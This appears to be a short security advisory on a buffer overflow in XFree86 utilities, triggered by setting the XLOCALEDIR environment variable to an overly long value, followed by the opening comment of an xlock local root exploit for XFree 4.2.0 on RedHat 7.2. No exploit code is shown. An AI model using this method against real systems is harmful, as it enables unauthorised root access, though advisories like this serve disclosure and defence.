Several XFree86 utilities may be prone to a buffer overflow condition. The vulnerability exists due to insufficient boundary checks performed by these utilities when referencing the XLOCALEDIR environment variable.

A local attacker can exploit this vulnerability by setting the XLOCALEDIR environment variable to an overly long value. When the vulnerable utilities are executed, the buffer overflow vulnerability will be triggered.

/*  xlock local root exploit for XFree 4.2.0, RedHat 7.2,
 *  maybe others, based on overflowing XLOCALEDIR,
 *  by omega of the S.T.A.R. team.
 *  This is a re-make of the original work for Slackware 8.1
 *  by dcryptr && tarranta / oC.
